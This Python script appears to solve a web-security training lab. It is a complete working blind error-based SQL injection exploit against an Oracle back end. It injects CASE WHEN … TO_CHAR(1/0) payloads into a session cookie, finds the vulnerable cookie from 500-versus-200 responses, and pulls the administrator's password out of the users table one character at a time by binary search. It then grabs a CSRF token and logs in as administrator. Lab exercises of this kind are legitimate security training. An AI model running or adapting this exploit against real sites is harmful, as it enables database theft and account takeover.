import sys
import warnings
from typing import Optional
from urllib.parse import urljoin

from bs4 import BeautifulSoup
from requests import RequestException, Response
from requests.sessions import Session

warnings.filterwarnings("ignore", message="Unverified HTTPS")


class LabExploit:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self.db_engine: Optional[str] = None
        self.target_cookie: Optional[str] = None

    def _send_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
    ) -> Optional[Response]:
        """Helper handle all HTTP communication"""
        target_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method,
                target_url,
                params=params,
                data=data,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except RequestException as e:
            print(f"[-] Connection error: {e}")
            return None

    def is_active(self) -> bool:
        print("[*] Phase 1: Checking if lab is active...")
        res = self._send_request("")
        return res is not None and "academyLabBanner" in res.text

    def identify_vulnerable_cookie(self) -> Optional[str]:
        print("[*] Phase 2: Probing cookies for Error-Based SQLi anchor...")
        for cookie in self.session.cookies:
            original_value = cookie.value
            # From the lab description we already know the db engine is ORACLE
            # Simple 1=1 case to force an error on vulnerable point
            # if the cookie is vulnerable then the server will attempt 1/0 and return 500
            payload_true = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) || '"
            cookie.value = f"{original_value}{payload_true}"
            res_error = self._send_request("")
            # 1=2 should not trigger the error and return 200 OK
            payload_false = "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) || '"
            cookie.value = f"{original_value}{payload_false}"
            res_ok = self._send_request("")
            cookie.value = original_value
            if (
                res_ok is not None
                and res_ok.status_code == 200
                and res_error is not None
                and res_error.status_code == 500
            ):
                print(f"[+] Identified vulnerable cookie: {cookie.name}")
                self.target_cookie = cookie.name
                return cookie.name
        return None

    def check_condition(self, sql_condition) -> bool:
        """
        Checks the sql_condition usign Oracle Error-Based logic
        If condition is TRUE, server is forced a (1/0) error, which returns a 500 response
        """
        if not self.target_cookie:
            return False

        for cookie in self.session.cookies:
            if cookie.name == self.target_cookie:
                original_value = cookie.value
                payload = (
                    f"{original_value}' || "
                    f"(SELECT CASE WHEN ({sql_condition}) "
                    f"THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) || '"
                )
                cookie.value = payload
                res = self._send_request("")
                cookie.value = original_value
                return res is not None and res.status_code == 500
        return False

    def get_field_length(self, subquery: str) -> int:
        """Finds the length of a query field using Binary Search"""
        print("[*] Phase 4: Determining length pasword...")
        low = 1
        high = 100

        while low + 1 < high:
            mid = (high + low) // 2
            condition = f"({subquery}) > {mid}"
            print(
                f"\r[+] Current binary search range: [{low}, {high}] -> {mid}",
                end="",
                flush=True,
            )
            if self.check_condition(condition):
                low = mid
            else:
                high = mid
        print()
        print(f"[+] Password length: {high}")
        return high

    def find_data_string(self, lenght: int, subquery: str) -> str:
        """Find data string of a query field using Binary Search"""
        print("[*] Phase 5: Recovering password...")
        extracted_string = ""
        for pos in range(1, lenght + 1):
            low = 32
            high = 126
            substr_query = subquery.replace("REPLACE", f"{pos}")
            while low + 1 < high:
                mid = (high + low) // 2
                condition = f"({substr_query}) > {mid}"
                if self.check_condition(condition):
                    low = mid
                else:
                    high = mid
            extracted_string += chr(high)
            print(f"\r[+] Extracted string: {extracted_string}", end="", flush=True)
        print()
        return extracted_string

    def binary_search_exfiltration(
        self, column_name: str, table_name: str, where_clause: str
    ) -> str:
        """Extracts data character by character using Binary Search"""
        print(f"[*] Phase 3: Extracting {column_name} from {table_name}...")
        # Step 1: Determine column length
        length_query = f"SELECT LENGTH({column_name}) FROM {table_name} WHERE {where_clause} AND ROWNUM=1"
        password_length = self.get_field_length(length_query)

        # Step 2: Recover the password
        substr_query = f"SELECT ASCII(SUBSTR({column_name}, REPLACE, 1)) FROM {table_name} WHERE {where_clause} AND ROWNUM=1"
        # substr_query = f"SELECT (SUBSTR({column_name}, REPLACE, 1)) FROM {table_name} WHERE {where_clause} AND ROWNUM=1"
        admin_pass = self.find_data_string(password_length, substr_query)
        return admin_pass

    def authenticate_and_verify(self, username: str, password: str) -> bool:
        """Authenticates and verify if lab reached solved state"""
        print(f"[*] Phase 6: Attempting to login as: {username}...")
        # Step 1: Extract CSRF token from login page
        res_login = self._send_request("login")
        if res_login is None or res_login.status_code != 200:
            print("[-] Could not load login page!")
            return False

        soup = BeautifulSoup(res_login.text, "html.parser")
        csrf_tag = soup.find("input", attrs={"name": "csrf"})
        csrf_token = str(csrf_tag.get("value")) if csrf_tag else None
        if not csrf_token:
            print("[-] Could not extract CSRF token in login page!")
            return False
        print(f"[+] Extracted CSRF Token: {csrf_token}")
        # Step 2: Login
        login_data = {"csrf": csrf_token, "username": username, "password": password}
        self._send_request("login", data=login_data, method="POST")

        # Step 3: Verify
        res = self._send_request("")
        return res is not None and "Congratulation" in res.text

    def solve(self) -> None:
        # Check if lab url is active
        if not self.is_active():
            print("[-] Lab is not active or has expired!")
            return

        # Identify vulnerable cookie
        if not self.identify_vulnerable_cookie():
            print("[-] Could not find vulnerable cookie!")
            return

        # extract administrator password using lab specified information
        admin_pass = self.binary_search_exfiltration(
            "password", "users", "username='administrator'"
        )

        # authenticate and verify
        if self.authenticate_and_verify("administrator", admin_pass):
            print("[!] SUCCESS: Logged in and lab solved")
        else:
            print("[-] Lab not solved!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} 'https://lab-id.web-security-academy.net'")
        sys.exit(1)

    url = sys.argv[1].strip()

    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
